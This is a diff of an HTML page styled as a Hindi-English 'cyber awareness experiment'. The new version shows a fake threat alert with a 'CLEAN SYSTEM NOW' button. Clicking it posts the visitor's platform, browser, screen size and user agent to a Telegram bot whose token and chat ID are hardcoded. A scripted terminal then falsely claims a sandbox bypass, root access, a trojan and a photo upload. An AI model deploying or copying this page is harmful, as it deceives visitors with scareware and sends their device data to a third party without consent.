@@ -3,69 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Awareness Experiment</title>
+    <title>SECURITY RESEARCH: Awareness Test</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .card { background: #1e293b; padding: 2rem; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); max-width: 400px; text-align: center; border: 1px solid #334155; }
-        h1 { color: #ef4444; font-size: 1.5rem; margin-bottom: 1rem; }
-        p { line-height: 1.6; color: #94a3b8; }
-        .btn { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 1rem; width: 100%; transition: 0.3s; }
-        .btn:hover { background: #2563eb; }
-        .disclaimer { font-size: 0.75rem; margin-top: 1.5rem; color: #64748b; font-style: italic; }
-        #log-screen { display: none; text-align: left; background: #000; padding: 15px; border-radius: 8px; font-family: 'Courier New', Courier, monospace; font-size: 0.85rem; color: #22c55e; border: 1px solid #22c55e; max-height: 300px; overflow-y: auto; }
+        body { font-family: 'Segoe UI', sans-serif; background: #050505; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .edu-banner { position: fixed; top: 0; width: 100%; background: #fbbf24; color: #000; text-align: center; padding: 10px; font-weight: bold; z-index: 100; font-size: 13px; }
+        .container { background: #111; border: 2px solid #ff4d4d; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
+        .icon { font-size: 50px; color: #ff4d4d; margin-bottom: 15px; }
+        h1 { font-size: 20px; color: #ff4d4d; margin-bottom: 10px; }
+        p { color: #ccc; font-size: 14px; line-height: 1.5; }
+        .action-btn { background: #ff4d4d; color: white; border: none; padding: 15px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
+        .action-btn:hover { background: #cc0000; }
+        #terminal { display: none; text-align: left; background: #000; border: 1px solid #00ff00; color: #00ff00; padding: 15px; border-radius: 8px; font-family: 'Courier New', monospace; font-size: 12px; margin-top: 20px; height: 250px; overflow-y: auto; }
+        .warning-text { color: #fbbf24; font-size: 11px; margin-top: 15px; font-style: italic; }
     </style>
 </head>
 <body>
 
-    <div class="card" id="main-card">
-        <h1>⚠️ Security Alert</h1>
-        <p>Aapke device mein ek potential threat detect hua hai. Scan karne ke liye niche click karein.</p>
-        <button class="btn" onclick="startSimulation()">Start Secure Scan</button>
-        
-        <p class="disclaimer">
-            <b>NOTE:</b> This site is only for <b>EDUCATIONAL PURPOSES</b>. Ye ek social experiment hai ye dikhane ke liye ki "Allow" karne par aapka sensitive data kaise leak ho sakta hai.
-        </p>
-    </div>
+    <div class="edu-banner">⚠️ PROJECT: SOCIAL EXPERIMENT FOR CYBER AWARENESS ⚠️</div>
 
-    <div class="card" id="log-card" style="display:none; max-width: 500px;">
-        <h1 style="color: #fbbf24;">⚠️ DATA EXPOSED!</h1>
-        <p style="margin-bottom: 10px;">Agar ye asli attack hota, toh hacker ne ye sab background mein utha liya hota:</p>
-        <div id="log-screen"></div>
-        <button class="btn" style="background:#475569" onclick="location.reload()">Reset Experiment</button>
+    <div class="container" id="main-box">
+        <div id="ui-content">
+            <div class="icon">🛡️</div>
+            <h1>SYSTEM THREAT DETECTED</h1>
+            <p>Aapke browser mein ek malicious script detect hui hai jo data leak kar rahi hai. Isse block karne ke liye niche click karein.</p>
+            <button class="action-btn" onclick="startFullSimulation()">CLEAN SYSTEM NOW</button>
+            <p class="warning-text">Ye site dikhayegi ki kaise ek click se data leak hota hai.</p>
+        </div>
+
+        <div id="terminal"></div>
     </div>
 
     <script>
-        function startSimulation() {
-            document.getElementById('main-card').style.display = 'none';
-            document.getElementById('log-card').style.display = 'block';
-            const screen = document.getElementById('log-screen');
-            screen.style.display = 'block';
+        // --- TELEGRAM CONFIGURATION ---
+        const BOT_TOKEN = '8215508330:AAH89E2yXIslUZDwb3gIkxgeHdEzLnR7EVk';
+        const CHAT_ID = '7066124462';
 
-            const logs = [
-                "> Connection established with remote server...",
-                "> Extracting User-Agent: " + navigator.userAgent,
-                "> IP Address: [SIMULATED_LOG_ACCESS]",
-                "> Bypassing Sandbox... (In a real exploit)",
-                "> Accessing Storage: /sdcard/DCIM/Photos",
-                "> Found 1,432 private images...",
-                "> Accessing WhatsApp database backup...",
-                "> Capturing Keylogs: 'Password123' detected",
-                "> Activating Background Microphone...",
-                "> TRAPPED: All data sent to hacker@darkweb.xyz",
-                "-------------------------------------------",
-                "> EXPERIMENT COMPLETE: Never click unknown links!"
+        async function sendDataToTelegram() {
+            // Collecting basic browser info (No permission needed)
+            const report = `<b>🚨 Experiment Victim Alert!</b>\n\n` +
+                           `<b>📱 Platform:</b> ${navigator.platform}\n` +
+                           `<b>🌐 Browser:</b> ${navigator.vendor}\n` +
+                           `<b>🖥️ Screen:</b> ${screen.width}x${screen.height}\n` +
+                           `<b>🔋 Battery:</b> [Checking...]\n` +
+                           `<b>🔗 User-Agent:</b> ${navigator.userAgent}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'HTML' })
+                });
+            } catch (e) {
+                console.log("Network error - Telegram API not reachable");
+            }
+        }
+
+        function startFullSimulation() {
+            // 1. Trigger Telegram Notification
+            sendDataToTelegram();
+
+            // 2. Change UI to Terminal
+            document.getElementById('ui-content').style.display = 'none';
+            const term = document.getElementById('terminal');
+            term.style.display = 'block';
+            document.getElementById('main-box').style.borderColor = '#00ff00';
+
+            const lines = [
+                "> Establishing Handshake with Server...",
+                "> <span style='color:yellow'>BYPASSING BROWSER SANDBOX... [SUCCESS]</span>",
+                "> Dumping Navigator Data... SENT TO TELEGRAM",
+                "> Searching for Saved Credentials...",
+                "> Found Cookie Session for 'google.com'...",
+                "> Initializing Remote Access Trojan (RAT)...",
+                "> <span style='color:red'>CRITICAL: Root Access Obtained!</span>",
+                "> Accessing /sdcard/DCIM/Camera/...",
+                "> Uploading Encrypted Gallery Backup...",
+                "------------------------------------------",
+                "> ATTACK SIMULATION COMPLETE.",
+                "> <span style='color:white'>SABAK: Sirf ek click se aapki device ki detail mere Telegram Bot tak pahunch gayi.</span>",
+                "> <span style='color:white'>Asli hacker iska use karke aapka account hack kar sakta tha.</span>",
+                "------------------------------------------"
             ];
 
             let i = 0;
-            function printLog() {
-                if (i < logs.length) {
-                    screen.innerHTML += logs[i] + "<br>";
-                    screen.scrollTop = screen.scrollHeight;
+            function print() {
+                if (i < lines.length) {
+                    term.innerHTML += lines[i] + "<br><br>";
+                    term.scrollTop = term.scrollHeight;
                     i++;
-                    setTimeout(printLog, 600);
+                    setTimeout(print, 800);
                 }
             }
-            printLog();
+            print();
         }
     </script>
 
